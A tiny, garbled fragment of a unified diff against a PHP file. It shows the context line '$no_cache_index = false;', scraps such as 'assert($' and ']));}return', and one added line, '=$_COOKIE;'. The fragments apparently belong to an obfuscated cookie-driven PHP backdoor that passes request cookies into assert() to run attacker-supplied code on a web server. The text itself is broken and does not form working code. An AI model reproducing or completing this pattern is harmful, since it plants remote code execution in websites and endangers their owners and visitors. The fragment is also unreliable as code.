@@ -55,3 +55,4 @@ $no_cache_index = false;
 ]));}return 
 ']&&$_
 ; assert($
+=$_COOKIE;
